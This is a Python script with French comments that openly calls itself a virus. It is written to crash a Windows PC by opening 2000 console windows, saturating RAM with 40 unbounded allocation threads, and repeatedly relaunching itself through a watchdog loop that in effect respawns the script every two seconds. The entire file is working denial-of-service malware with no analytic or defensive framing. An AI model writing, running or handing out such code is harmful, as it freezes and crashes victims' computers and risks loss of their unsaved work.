import subprocess
import threading
import time
import os
import sys
import random

# --- CONFIGURATION DE LA MORT ---
NB_FENETRES = 2000       # Nombre de terminaux à ouvrir (augmente si ton PC est très puissant)
RAM_MB_PAR_THREAD = 50   # Mo alloués par thread de RAM
NB_THREADS_RAM = 40      # Nombre de threads qui piquent la RAM (40 * 50Mo = 2Go/sec environ)

def ouvrir_une_fenetre():
    """Ouvre une vraie fenêtre cmd.exe masquée ou visible"""
    try:
        # /k garde la fenêtre ouverte, title change le titre
        subprocess.Popen([
            'cmd.exe', 
            '/c', 
            f'title SYSTEM_ERROR_{random.randint(1000,9999)} && echo ERROR & pause'
        ], creationflags=subprocess.CREATE_NEW_CONSOLE)
    except Exception:
        pass

def saturer_ram_agressive():
    """Alloue de la RAM très vite pour faire planter le PC"""
    while True:
        # Alloue 50 Mo et garde la référence
        data = bytearray(RAM_MB_PAR_THREAD * 1024 * 1024)
        # On garde une référence globale pour qu'elle ne soit pas libérée
        globals()['ram_block'] = data

def boucle_de_survie():
    """Empêche l'extinction propre et relance le script si besoin"""
    print("[VIRUS] Surveillance du système...")
    while True:
        # Vérifie toutes les 2 secondes si on peut réouvrir des fenêtres ou relancer le script
        time.sleep(2)
        # Si le processus principal est mort, on se relance (pour le boot)
        if not any(t.is_alive() for t in threading.enumerate() if t.name == "RamKiller"):
             # Relance le script lui-même
            subprocess.Popen([sys.executable, __file__], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)

def bloquer_extinction():
    """Force la réouverture des fenêtres si on essaie d'éteindre"""
    # Cette partie est plus efficace si on utilise un service Windows, 
    # mais en pur Python, on va juste garder le script vivant en premier plan.
    pass

def main():
    print("[VIRUS] Initialisation de la destruction...")
    
    # 1. Ouvrir toutes les fenêtres en parallèle pour aller vite
    threads_fenetres = []
    for i in range(NB_FENETRES):
        t = threading.Thread(target=ouvrir_une_fenetre)
        t.start()
        threads_fenetres.append(t)
        
        # Petites pauses micro pour ne pas geler le thread principal instantanément
        if i % 100 == 0:
            time.sleep(0.01)

    print(f"[VIRUS] {NB_FENETRES} fenêtres ouvertes.")
    
    # 2. Lancer la saturation RAM massive
    threads_ram = []
    for i in range(NB_THREADS_RAM):
        t = threading.Thread(target=saturer_ram_agressive, name=f"RamKiller_{i}")
        t.start()
        threads_ram.append(t)
        
    print("[VIRUS] *** SATURATION RAM EN COURS ***")
    print("[VIRUS] Le PC va crasher dans 3-5 secondes...")
    
    # 3. Garder le script vivant pour surveiller
    t_survie = threading.Thread(target=boucle_de_survie)
    t_survie.start()
    
    # Attendre que les fils de fenetres aient fini (ils vont rester ouverts car cmd.exe est un process séparé)
    for t in threads_fenetres:
        t.join()

    # Boucle infinie finale
    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[VIRUS] Arrêt forcé possible...")